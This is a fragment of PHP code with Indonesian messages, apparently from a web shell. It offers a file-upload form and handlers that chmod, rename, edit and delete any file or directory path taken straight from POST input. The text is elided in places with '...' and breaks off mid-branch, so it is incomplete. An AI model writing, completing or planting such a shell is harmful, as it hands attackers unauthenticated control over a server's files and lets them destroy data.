...
<font color="white">Uplot Filenya :</font> <input type="file" name="file" />
...
echo '<font color="aqua">Change Permission Berhasil</font><br/>';
}else{
...
echo '<font color="aqua">Ganti Nama Berhasil</font><br/>';
}else{
...
echo '<font color="aqua">Berhasil Edit File</font><br/>';
}else{
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="aqua">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="aqua">File Terhapus</font><br/>';
}else{
